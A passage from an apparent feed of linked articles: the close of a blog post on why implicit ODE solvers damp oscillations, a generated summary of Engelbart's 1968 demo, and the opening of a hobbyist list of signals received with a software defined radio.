    &lt;p&gt;You should now be the student in the front row raising your hand, “implicit methods are always dampening… is that actually a good idea? Are you sure that’s always correct?” And the answer is… well it’s not. And that then gives us exactly the failure case for which implicit methods are less robust. If you have a system that is supposed to actually oscillate, then this “hey let’s always dampen everything to make solving more robust” actually leads to very wrong answers!&lt;/p&gt;
    &lt;p&gt;To highlight this, let’s just take a simple oscillator. You can think of this as a harmonic oscillator, or you can think about it as a simple model of a planet going around a star. However you want to envision it, you can write it out as a system of ODEs:&lt;/p&gt;
    &lt;p&gt;$$u_1′ = 500u_2$$&lt;lb/&gt; $$u_2′ = -500u_1$$&lt;/p&gt;
    &lt;p&gt;This is the linear ODE $u’ = Au$ where $A = [0\ 500; -500\ 0]$, which has complex eigenvalues with zero real part. In other words, the analytical solution is $\sin(500t)$ and $\cos(500t)$, just a pure oscillation that just keeps going around and around in circles. If we solve this with an explicit ODE solver:&lt;/p&gt;
    &lt;quote&gt;function f(du,u,p,t) du[1] = 500u[2] du[2] = -500u[1] end u0 = [1.0,1.0] tspan = (0.0,1.0) prob = ODEProblem(f, u0, tspan) sol = solve(prob, Tsit5()) plot(sol, title="RK Method", idxs=(1,2)) savefig("rk_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;we can see that it generally gets the right answer. Over time you get some drift where the energy is slowly increasing due to numerical error in each step, but it’s going around in circles relatively well. However, our “robust implicit method”…&lt;/p&gt;
    &lt;quote&gt;sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method", idxs=(1,2)) savefig("bdf_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;is just not even close. And you can see that even our “robust Modelica tools” completely fall apart:&lt;/p&gt;
    &lt;p&gt;It says the answer goes to zero! Even when the analytical solution is just a circle! But we can understand why this is the case: the software developers made the implicit assumption that “dampening oscillations is always good, because generally that’s what happens in models, so let’s always do this by default so people get better answers”, and the result of this choice is that if someone puts in a model of the Earth going around the sun, then oops the Earth hits the sun pretty quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion: ODE solvers make trade-offs, you need to make the right ones for your domain&lt;/head&gt;
    &lt;p&gt;This gives us the conclusion: there is no “better” or “more robust” ODE solver method, it’s domain-specific. This is why the Julia ODE solver package has hundreds of methods, because each domain can be asking for different properties that they want out of the method. Explicit methods are not generally faster, they are also something that tends to preserve (or generate) oscillations. Implicit methods are not generally more robust, they are methods which work by dampening transients, which is a good idea for some models but not for others. But then there’s a ton of nuance. For example, can you construct an explicit ODE solver so that on such oscillations you don’t get energy growth? You can! Anas5(w) is documented as “4th order Runge-Kutta method designed for periodic problems. Requires a periodicity estimate w which when accurate the method becomes 5th order (and is otherwise 4th order with less error for better estimates)”, i.e. if you give it a canonical frequency 500 it will be able to do extremely well on this problem (and being a bit off in that estimate still works, it just has energy growth that is small).&lt;/p&gt;
    &lt;p&gt;What about what was mentioned at the beginning of the article, “for hyperbolic PDEs you need to use explicit methods”? This isn’t a “special behavior” of PDEs, this is simply because for this domain, for example advective models of fluids, you want to conserve fluid as it moves. If you choose an implicit method, it “dampens” the solver, which means you get that as you integrate you get less and less fluid, breaking the conservation laws and giving qualitatively very incorrect solutions. If you use explicit methods, you don’t have this extraneous dampening, and this gives a better looking solution. But you can go even further and develop methods for which, if $h$ is sufficiently small, then you get little to no dampening. These are SSP methods, which we say are “for Hyperbolic PDEs (Conservation Laws)” but in reality what we mean is “when you don’t want things to dampen”.&lt;/p&gt;
    &lt;p&gt;But the point is, you can’t just say “if you want a better solution, use an implicit solver”. Maybe in some domains and for some problems that is true, but in other domains and problems that’s not true. And many numerical issues can stem from the implicit assumptions that follow from the choice being made for the integrator. Given all of this, it should be no surprise that much of the Modelica community has had many problems handling fluid models, the general flow of “everything is a DAE” → “always use an implicit solver” → “fluid models always dampen” → “we need to fix the dampening” could be fixed by making different assumptions at the solver level.&lt;/p&gt;
    &lt;p&gt;So, the next time someone tells you should just use ode15s or scipy.integrate.radau in order to make things robust without knowing anything about your problem, say “umm actually”.&lt;/p&gt;
    &lt;head rend="h2"&gt;Little Extra Details&lt;/head&gt;
    &lt;p&gt;The article is concluded. But here’s a few points I couldn’t fit into the narrative I want to mention:&lt;/p&gt;
    &lt;head rend="h3"&gt;Trapezoidal is cool&lt;/head&gt;
    &lt;p&gt;One piece I didn’t fit in here is that the Trapezoidal method is cool. The dampening property comes from L-stability, i.e. $G(z) \rightarrow 0$ as $\text{Re}(z) \rightarrow -\infty$. This is a stricter form of stability, since instead of just being stable for any finite $\lambda$, this also enforces that you are stable at the limit of bigger lambdas. “Most” implicit solvers that are used in practice, like Implicit Euler, have this property, and you can show the dampening is directly related to this property. But you can have an implicit method that isn’t L-stable. Some of these methods include Adams-Bashforth-Moulton methods, which are not even A-stable so they tend to have stability properties and act more like explicit methods. But the Trapezoidal method is A-stable without being L-stable, so it doesn’t tend to dampen while it tends to be also pretty stable. Though it’s not as stable, and the difference between “is stable for any linear ODE” versus “actually stable for nonlinear ODEs” (i.e. B-stability) is pronounced on real-world stiff problems. What this means in human terms is that the Trapezoidal method tends to not be stable enough for hard stiff problems, but it also doesn’t artificially dampen, so it can be a good default in cases where you know you have “some stiffness” but also want to keep some oscillations. One particular case of this is in some electrical circuit models with natural oscillators.&lt;/p&gt;
    &lt;head rend="h3"&gt;Lower order methods have purposes too&lt;/head&gt;
    &lt;p&gt;“All ODE solvers have a purpose”, I give some talks that give the justification for many high order methods, so in general “higher order is good if you solve with stricter tolerances and need more precision”. But lower order methods can be better because the higher order methods require that more derivatives of $f$ are defined, and if that’s not the case (like derivative discontinuities), then lower order methods will be more efficient. So even implicit Euler has cases where it’s better than higher order BDF methods, and it has to do with “how nice” $f$ is.&lt;/p&gt;
    &lt;head rend="h3"&gt;BDF methods like DASSL are actually α-stable&lt;/head&gt;
    &lt;p&gt;I said that generally implicit methods that you use are A-stable. That’s also a small lie to make the narrative simpler. The BDF methods which Sundials, DASSL, LSODE, FBDF, etc. use are actually α-stable, which means that they are actually missing some angle α of the complex plane for stability. The stability regions look like this:&lt;/p&gt;
    &lt;p&gt;So these BDF methods are actually pretty bad for other reasons on very oscillatory problems! Meanwhile, things like Rosenbrock methods can also solve DAEs while actually being L-stable, which can make them more stable in many situations where there’s oscillations towards a steady state. So there’s a trade-off there… again every method has a purpose. But this is another “ode15s is more stable than ode23s”… “well actually…”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.stochasticlifestyle.com/implicit-ode-solvers-are-not-universally-more-robust-than-explicit-ode-solvers-or-why-no-ode-solver-is-best/"/><published>2025-09-16T13:41:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45262582</id><title>Mother of All Demos (1968)</title><updated>2025-09-16T16:11:53.484711+00:00</updated><content>&lt;doc fingerprint="f5949b9b0b338081"&gt;
  &lt;main&gt;&lt;head class="list-none text-xs cursor-pointer opacity-60 hover:opacity-80 transition-all max-w-[42rem] self-center mx-auto"&gt; English Â· 00:05:36 Sep 16, 2025 2:15 PM &lt;/head&gt;&lt;head rend="h1"&gt;1968 âMother of All Demosâ by SRIâs Doug Engelbart and Team&lt;/head&gt;&lt;head rend="h2"&gt;SUMMARY&lt;/head&gt;&lt;p&gt;Douglas Engelbart's 1968 "Mother of All Demos" at SRI showcased interactive computing innovations, including the mouse debut, hypertext, real-time editing, and collaborative tools, envisioning augmented human intellect.&lt;/p&gt;&lt;head rend="h2"&gt;STATEMENTS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;The Augmented Human Intellect Research Center at Stanford Research Institute has pursued computer systems that enhance intellectual work by providing instant responsiveness to user actions throughout the day.&lt;/item&gt;&lt;item&gt;The demo features a computer mouse that controls a tracking spot on a networked display, allowing seamless interaction with text and graphics.&lt;/item&gt;&lt;item&gt;Users can create and manipulate entities like statements and words, including operations such as copying, moving, and reorganizing content in real-time.&lt;/item&gt;&lt;item&gt;Hypertext linking enables jumping between files, such as connecting a text list to a visual map for contextual information like overdue books.&lt;/item&gt;&lt;item&gt;Shared-screen collaboration allows remote participants to view and point to the same display, with audio coupling for discussion, while reserving primary control to the host.&lt;/item&gt;&lt;item&gt;Video integration permits seeing the collaborator's face during work, enhancing remote teamwork through live feeds from the laboratory.&lt;/item&gt;&lt;item&gt;An upcoming ARPA computer network will connect experimental systems, enabling low-latency responses across distances, like from Cambridge to Menlo Park.&lt;/item&gt;&lt;item&gt;The network aims to provide services for managing information, such as locating available resources, protocols, and documents in a distributed environment.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;IDEAS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;A computer system alive all day, instantly responsive to every action, could dramatically amplify an intellectual worker's productivity and value creation.&lt;/item&gt;&lt;item&gt;Naming the input device a "mouse" was arbitrary but stuck, highlighting how simple conventions can endure in technological evolution.&lt;/item&gt;&lt;item&gt;Starting projects with a blank digital canvas mirrors traditional paper, but enables immediate entity creation and error correction without physical waste.&lt;/item&gt;&lt;item&gt;Copying and moving groups of statements or words allows fluid reorganization of information, turning chaotic lists into structured outputs like categorized produce.&lt;/item&gt;&lt;item&gt;Hypertext links transform static files into interconnected webs, where pointing to an element reveals layered details, such as a route map tied to tasks.&lt;/item&gt;&lt;item&gt;Collaborative "bug fights" let multiple users argue over content in real-time, with hierarchical control ensuring productive discourse without chaos.&lt;/item&gt;&lt;item&gt;Integrating audio, video, and shared screens creates a virtual blackboard, where control can be passed like handing over chalk in a physical meeting.&lt;/item&gt;&lt;item&gt;Future networks could democratize access to computing power, allowing seamless demos from distant locations like Boston conferences.&lt;/item&gt;&lt;item&gt;Organizing network informationâtracking services, protocols, and availabilityâposes a novel challenge for applying augmented tools to infrastructure itself.&lt;/item&gt;&lt;item&gt;The demo's innovations foreshadow a world where human intellect is augmented not replaced, emphasizing partnership between people and machines.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;INSIGHTS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;True augmentation of human intellect lies in tools that extend cognitive capabilities seamlessly, turning individual work into collective, networked intelligence without overwhelming the user.&lt;/item&gt;&lt;item&gt;Interactive computing fundamentals, like the mouse and hypertext, reveal that intuitive interfaces can unlock exponential productivity by mimicking natural thought processes.&lt;/item&gt;&lt;item&gt;Collaborative systems with shared views and controls highlight how technology can bridge distances, fostering real-time human connection akin to in-person ideation.&lt;/item&gt;&lt;item&gt;The persistence of simple innovations, such as device naming or basic editing, underscores that foundational user experiences drive long-term technological adoption and evolution.&lt;/item&gt;&lt;item&gt;Envisioning networks as information ecosystems suggests that managing metadata about systems themselves will be as crucial as the systems, enabling scalable human flourishing in digital realms.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;QUOTES&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;"If in your office you as an intellectual worker were supplied with a computer display backed up by a computer that was alive for you all day and was instantly responsive to every action you had how much value could you drive from that."&lt;/item&gt;&lt;item&gt;"I don't know why we call it a mouse sometimes I apologize it started that way and we never did change it."&lt;/item&gt;&lt;item&gt;"This characterizes the way I could sit here and look at a blank piece of paper that's the way I start many projects so with my system that's a good start."&lt;/item&gt;&lt;item&gt;"Yeah that's they call a bug fight so we set up now audio coupling and we're both looking at the same display and that'd be very handy to work we can talk to each other in point."&lt;/item&gt;&lt;item&gt;"I'd like to see you while I'm working on it and we're going to go for a picture down in our laboratory in Menlo Park and pipe it up come in Menlo Park."&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;HABITS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Begin intellectual projects by loading a blank digital canvas, akin to starting with a blank sheet of paper, to foster initial idea generation.&lt;/item&gt;&lt;item&gt;Use immediate error correction during text input, such as backing up to fix mistakes, to maintain workflow momentum.&lt;/item&gt;&lt;item&gt;Reorganize information dynamically by copying, moving, and grouping elements, like sorting lists into categories for clarity.&lt;/item&gt;&lt;item&gt;Engage in real-time collaboration by pointing and discussing shared displays, reserving primary control while allowing input from others.&lt;/item&gt;&lt;item&gt;Integrate visual and audio cues in remote work, such as viewing a collaborator's face, to enhance interpersonal connection during tasks.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;FACTS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;The December 9, 1968, demo at SRI introduced the computer mouse publicly for the first time.&lt;/item&gt;&lt;item&gt;Engelbart's team demonstrated hypertext linking, allowing navigation between related files and visuals.&lt;/item&gt;&lt;item&gt;The system featured real-time text editing with multiple windows and flexible view controls on cathode ray tube displays.&lt;/item&gt;&lt;item&gt;Shared-screen teleconferencing was shown with a remote participant in Menlo Park interacting via a less powerful "bug."&lt;/item&gt;&lt;item&gt;The ARPA network, precursor to the internet, was planned to connect about 20 experimental computers within a few years.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;REFERENCES&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Augmented Human Intellect Research Center at Stanford Research Institute (SRI).&lt;/item&gt;&lt;item&gt;ARPA computer network (experimental, first form in about a year, expanding to 20 computers).&lt;/item&gt;&lt;item&gt;On-Line System (NLS), implied in the demo's text editing and linking tools.&lt;/item&gt;&lt;item&gt;Picture drawing capability for maps and routes in the system.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;HOW TO APPLY&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Acquire or simulate an interactive display system that responds instantly to inputs, starting with basic mouse-like controls to manipulate digital entities like text.&lt;/item&gt;&lt;item&gt;Begin tasks by creating a blank workspace and inputting initial statements or words, using copy and move commands to build and iterate on ideas rapidly.&lt;/item&gt;&lt;item&gt;Implement hypertext links by associating text elements with external files or visuals, such as linking a task list to a route map for contextual depth.&lt;/item&gt;&lt;item&gt;Set up shared-screen collaboration with audio, designating one user as primary controller while allowing others to point and comment in real-time.&lt;/item&gt;&lt;item&gt;Prepare for networked environments by developing tools to track and organize meta-information, like service availability and protocols, to facilitate distributed work.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;ONE-SENTENCE TAKEAWAY&lt;/head&gt;&lt;p&gt;Embrace augmented intellect tools to multiply human productivity through intuitive, collaborative computing interfaces.&lt;/p&gt;&lt;head rend="h2"&gt;RECOMMENDATIONS&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Invest in responsive digital tools that mimic natural cognition to boost daily intellectual output.&lt;/item&gt;&lt;item&gt;Prioritize hierarchical controls in collaborative software to enable efficient "bug fights" without conflict.&lt;/item&gt;&lt;item&gt;Build interconnected systems with hypertext to reveal hidden layers of information intuitively.&lt;/item&gt;&lt;item&gt;Integrate multimediaâaudio, video, and shared viewsâfor remote work that feels as natural as face-to-face.&lt;/item&gt;&lt;item&gt;Design future networks with built-in information services to streamline access to resources and expertise.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;MEMO&lt;/head&gt;&lt;p&gt;In the flickering glow of a cathode ray tube on December 9, 1968, Douglas Engelbart and his team at Stanford Research Institute unveiled a vision that would redefine human-computer interaction. Dubbed the "Mother of All Demos," the presentation introduced the world to the computer mouseâa wooden prototype that guided a tracking spot across the screen with uncanny precision. Engelbart, ever the visionary, demonstrated not just hardware but a philosophy: augmenting human intellect through systems that respond instantly to every keystroke and gesture. He loaded blank digital canvases, manipulated words and statements with copy-paste fluidity, and reorganized chaotic lists into tidy categories, all while pondering aloud, "How much value could you drive from that?" This wasn't mere tinkering; it was a blueprint for intellectual workers empowered by alive, all-day computing.&lt;/p&gt;&lt;p&gt;The demo's magic deepened with collaboration across distances. From Menlo Park, a remote colleague joined via shared screen, their weaker "bug" pointing to Engelbart's text while audio lines crackled with discussion. What ensued was a "bug fight"âa lively argument over content, with Engelbart retaining ultimate control, much like a teacher wielding the chalk. Video feeds soon piped in the collaborator's face, transforming the abstract into the intimate, as if they shared a laboratory blackboard. Engelbart jumped through hypertext links, weaving text to maps: a grocery list bloomed into a route plan, revealing overdue books at the library. These feats foreshadowed networked futures, with the ARPA system on the horizon to link 20 computers, delivering Cambridge-speed responses and meta-services for protocols and papers.&lt;/p&gt;&lt;p&gt;Engelbart's legacy endures in our touchscreen world, reminding us that technology's highest purpose is partnership, not replacement. By organizing information as dynamically as thought itself, his innovations promisedâand deliveredâa era where human flourishing accelerates through seamless augmentation. The mouse may have started as a whim, but it scurried into history, proving that small inventions can bootstrap vast intellectual leaps.&lt;/p&gt;&lt;p&gt;Like this? Create a free account to export to PDF and ePub, and send to Kindle.&lt;/p&gt;Create a free account&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://wordspike.com/s/5ip0xneiTsc"/><published>2025-09-16T14:18:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45262835</id><title>Things you can do with a Software Defined Radio (2024)</title><updated>2025-09-16T16:11:52.443330+00:00</updated><content>&lt;doc fingerprint="b604197b7163def1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Fifty Things you can do with a Software Defined Radio ð»&lt;/head&gt;
    &lt;p&gt;Last week, I went on an adventure through the electromagnetic spectrum!&lt;/p&gt;
    &lt;p&gt;Itâs like an invisible world that always surrounds us, and allows us to do many amazing things: Itâs how radio and TV are transmitted, itâs how we communicate using Wi-Fi or our phones. And there are many more things to discover there, from all over the world.&lt;/p&gt;
    &lt;p&gt;In this post, Iâll show you fifty things you can find there â all you need is this simple USB dongle and an antenna kit!&lt;/p&gt;
    &lt;head rend="h2"&gt;The âMake 50 of Somethingâ technique&lt;/head&gt;
    &lt;p&gt;A couple of years ago, I heard about the âMake 50 of Somethingâ technique in Vi Hartâs Fifty Fizzbuzzes. Since then, Iâve already made fifty programs for the fantasy console TIC-80 in one weekend in 2021.&lt;/p&gt;
    &lt;p&gt;I found that a very exciting experience â trying to make so many new things really pushed me to leave my comfort zone, to be creative, and not to get sucked into rabbit holes too deep.&lt;/p&gt;
    &lt;p&gt;I knew I definitely wanted to try the technique again. So, when I took a week of vacation, I decided to try to find 50 things to do with a Software Defined Radio!&lt;/p&gt;
    &lt;head rend="h2"&gt;What is an SDR?&lt;/head&gt;
    &lt;p&gt;A Software Defined Radio is essentially a radio that relies on a computer to do most of its data processing. It doesnât rely on analog hardware too much â instead, most of what is does is âdefined in softwareâ, hence the name.&lt;/p&gt;
    &lt;p&gt;Usually, SDRs can detect electromagnetic waves in a much wider range than a common FM radio, which makes it especially exciting! I got interested in SDRs after reading about Albertâs project to build one as a module for the Framework laptop!&lt;/p&gt;
    &lt;head rend="h2"&gt;What youâll need&lt;/head&gt;
    &lt;p&gt;I went into this week without much knowledge of the things Iâd find. Iâd read through a introductory course for aspiring amateur radio operators (more on that later), but I barely knew which way to point my antenna.&lt;/p&gt;
    &lt;p&gt;If you want to follow along, this section is intended to help you get started!&lt;/p&gt;
    &lt;p&gt;Most of the 50 things also have a little infobox at the beginning, explaining the frequencies, and some special knowledge needed to receive them.&lt;/p&gt;
    &lt;head rend="h3"&gt;Hardware&lt;/head&gt;
    &lt;p&gt;I looked into the topic a bit, and a popular, cheap SDR right now is the RTL-SDR Blog V4, which has the form factor of a simple SUB dongle. You can get it for around $30, or as a kit with telescopic antennas for $50.&lt;/p&gt;
    &lt;p&gt;Everything I tried during this week was done using this USB dongle, the antenna kit, and a long piece of wire!&lt;/p&gt;
    &lt;p&gt;(By the way, thereâs another great option if you donât want to buy anything â lots of people make their SDR accessible through the Internet! You can find a map here.)&lt;/p&gt;
    &lt;head rend="h3"&gt;Using the antennas&lt;/head&gt;
    &lt;p&gt;I tried to adjust my antenna to the desired frequencies as best as I could. I think for receiving, itâs not super important that your antenna is perfectly configured, though.&lt;/p&gt;
    &lt;p&gt;For most applications, I used the dipole antennas that came with the kit I purchased. Dipole antennas have two sides that stick out the same length. You generally wanna make the whole antenna half as long as the wave length you want to receive, and orient it vertically.&lt;/p&gt;
    &lt;p&gt;My rule of thumb was to divide 72 by the frequency in MHz, and take that as the length of each side of the dipole in meters. Thatâd make the whole antenna a bit shorter than half of the wavelength.&lt;/p&gt;
    &lt;p&gt;For example, this is what the configuration looked like for frequencies around 100 MHz:&lt;/p&gt;
    &lt;p&gt;And for higher frequencies, I used the tiny screw-on antennas from the kit:&lt;/p&gt;
    &lt;p&gt;For specific applications like receiving satellites, or receiving locators for airplanes, I used special configurations, but Iâll discuss these as we go!&lt;/p&gt;
    &lt;head rend="h3"&gt;Software&lt;/head&gt;
    &lt;p&gt;The software I liked best, and which I used for many things, was SDR++. It allows you to explore the frequency spectrum very smoothly, and has a modern user interface!&lt;/p&gt;
    &lt;p&gt;But I also used plenty of other software, on Linux in my case. Iâll link to the software as needed below.&lt;/p&gt;
    &lt;head rend="h2"&gt;Monday&lt;/head&gt;
    &lt;p&gt;On Monday morning, I was excited to start this project! I sat down at my desk, and got to work!&lt;/p&gt;
    &lt;head rend="h3"&gt;1: Listen to FM radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM (âfrequency modulationâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This as an obvious first thing to do, as the signals are very strong! I was using the SDR++ software, and it felt very nice browsing around and discovering the stations around me! It reminded me of exploring the radio as a child.&lt;/p&gt;
    &lt;p&gt;I found a local station that gives 1-hour slots to civic groups, for example!&lt;/p&gt;
    &lt;head rend="h3"&gt;2: Listen to Freenet&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 149.01-149.11 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a special frequency range in Germany: Anyone is allowed to send there, using licensed devices. There are 6 channels.&lt;/p&gt;
    &lt;p&gt;I think someone was testing their device there when I listened in. :D I heard a âHellooo?â, then a âTest, testâ, and then a âGeneral call to all stationsâ. Oh, and shortly after a short transmission on channel 3 in a Slavic-sounding language!&lt;/p&gt;
    &lt;p&gt;Freenet devices have a range of only a couple of kilometers, so these people must have been pretty close! :O&lt;/p&gt;
    &lt;head rend="h3"&gt;3: Receive weather conditions from airports&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Differs by airport, search term is âATISâ&lt;/item&gt;
      &lt;item&gt;Modulation: AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;While browsing the aviation frequencies, I found this station that reports weather conditions in an endless loop. It seems to be the âAutomatic Terminal Information Serviceâ of Hamburg airport!&lt;/p&gt;
    &lt;p&gt;Thanks to that, I found out that the current air pressure was 1011 hPa! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;4: Listen to airplane communication&lt;/head&gt;
    &lt;p&gt;Listening to âmessages not meant for the general publicâ is not allowed in Germany, so of course I didnât do that. And if I had accidentally done that, I wouldnât be allowed to tell you about it. ð&lt;/p&gt;
    &lt;head rend="h3"&gt;5: Track aircraft via ADS-B&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 1090 MHz&lt;/item&gt;
      &lt;item&gt;Protocol: ADS-B&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thatâs short for âAutomatic Dependent Surveillance â Broadcastâ. Aircraft send it automatically to be tracked.&lt;/p&gt;
    &lt;p&gt;For this, I built my first antenna! From wire and and an antenna connector called âSMAâ.&lt;/p&gt;
    &lt;p&gt;And it worked! \o/ I decoded the signal using the software SDRangel. Fascinating! I saw some big &amp;amp; small airplanes, and even a helicopter!&lt;/p&gt;
    &lt;head rend="h3"&gt;6: Listen to stereo FM radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How stereo audio is transmitted is really interesting, because itâs backwards-compatible to receivers that donât support it:&lt;/p&gt;
    &lt;p&gt;Here, you see the demodulated audio frequency spectrum, as shown in SDRangel. Below 19k Hz, itâs just mono audio. Then, to mark a stereo station, thereâs a constant âpilot toneâ at 19k Hz! (Outside of what most humans can hear.)&lt;/p&gt;
    &lt;p&gt;Then, if you double the frequency of the pilot tone, you can derive the sections where the difference of the left &amp;amp; right channel to the mono channel is transmitted!&lt;/p&gt;
    &lt;p&gt;Correction: Iâve been told that instead of what I call âleftâ and ârightâ in this diagram, the upper frequencies transmit the difference of the left and right channels! That way, the receiver can calculate the left and right channels from the mono signal (which is, esseutially, the sum of left and right).&lt;/p&gt;
    &lt;head rend="h3"&gt;7: Receive road traffic information&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you triple the frequency of the pilot tone, you get to a range where FM stations transmit small amounts of digital metadata, like the name and genre of the station, and the current song! Thatâs a protocol called Radio Data System.&lt;/p&gt;
    &lt;p&gt;This system can also transmit road traffic information! There seemed to be a road closure at â0x64BEâ, as decoded by SDRangel.&lt;/p&gt;
    &lt;p&gt;The Federal Highway Research Institute publishes an Excel table, where I could look up that this is a town in Lower Saxony!&lt;/p&gt;
    &lt;head rend="h3"&gt;8: Listen to conversations on the 2-meter amateur radio band&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 144-146 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a frequency range reserved for amateur radio operators â for non-commercial use only. You may send on this band after getting a license.&lt;/p&gt;
    &lt;p&gt;What I found here is seemingly a conversation circle facilitated by a relay around 15 km away from here â it takes input on a certain frequency, and outputs an amplified copy of it on another frequency! Klaus, Bernd, JÃ¼rgen and Horst were talking about antennas, relays, and Windows XP! ð&lt;/p&gt;
    &lt;head rend="h3"&gt;9: Listen to digital radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 174-240 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The SDRangel software also has a demodulator for Digital Audio Broadcast! :O I continue to be amazed by it!&lt;/p&gt;
    &lt;p&gt;I think this was the first time Iâve received digital radio via air! I saw so many stations, and Iâve only checked a couple of channels.&lt;/p&gt;
    &lt;p&gt;The advantage of this digital channel is that thereâs no noise. And I even saw a âcover imageâ in one of the programs!&lt;/p&gt;
    &lt;head rend="h3"&gt;10: Listen to PMR446&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 446.0-446.2 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a frequency range for âPrivate Mobile Radioâ. Itâs another of these bands where anyone can transmit using a licensed device!&lt;/p&gt;
    &lt;p&gt;Not a lot of activity here. I heard âHello, hellooo!â, âCan you hear me?â and some short transmissions that sounded like a child! :D&lt;/p&gt;
    &lt;p&gt;There also seemed to be digital transmissions, but I didnât know how to decode them yet.&lt;/p&gt;
    &lt;p&gt;The range of PMR446 devices is pretty low (a couple of hundred metres in cities), so again, the people mustâve been close!&lt;/p&gt;
    &lt;head rend="h2"&gt;Tuesday&lt;/head&gt;
    &lt;p&gt;After the first day of SDR experiments, I was amazed how much invisible communication is going on around us in the electromagnetic spectrum at the same time!&lt;/p&gt;
    &lt;p&gt;I posted each of these things on Mastodon as I went, and asked people for suggestions for more things I could receive.&lt;/p&gt;
    &lt;head rend="h3"&gt;11: Read your neighborsâ sensors&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 433.05-434.79 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At 433 MHz, thereâs a frequency band for âindustrial, scientific and medicalâ applications. And wow, there was quite a lot of activity nearby!&lt;/p&gt;
    &lt;p&gt;Using the decoder rtl_433, I saw two sensors that output the current temperature, humidity, and air pressure!&lt;/p&gt;
    &lt;p&gt;There were also some âIBIS beaconsâ flying by, which are used in public transportation, so maybe itâs buses driving by?&lt;/p&gt;
    &lt;p&gt;Later, an âInterlogix Securityâ device also appeared, reporting âclosed switch statesâ :O&lt;/p&gt;
    &lt;head rend="h3"&gt;12: Track ships!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 162.025 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ships send out their status using AIS (Automatic Identification System). And again, I received a lot of them here in Hamburg! :O&lt;/p&gt;
    &lt;p&gt;I was especially excited to receive data from the MS Stubnitz (a fisher boat that was turned into a culture center/techno club)! It reports its status as âmooredâ, and its speed as 0.1 knots! :D&lt;/p&gt;
    &lt;p&gt;Again, I used the software SDRangel. Apparently, it can also display a 3D map, but I havenât figured out how to add 3D modelsâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;13: Detect GSM activity&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 876-959 MHz, I looked up the specific ranges for Germany on Wikipedia&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was curious whether you could tell if someone used their phone! So I borrowed a GSM phone, tuned to the correct frequencies, and made some test calls.&lt;/p&gt;
    &lt;p&gt;What surprised me most: You can kind of âseeâ the volume at which I was talking!?&lt;/p&gt;
    &lt;p&gt;In the recording, the three dense bands at the end were when I was humming into the phone at the other end. This only worked in the âreceivingâ direction.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wednesday&lt;/head&gt;
    &lt;head rend="h3"&gt;14: Receive signals from a satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 136-138 MHz&lt;/item&gt;
    &lt;/list&gt;
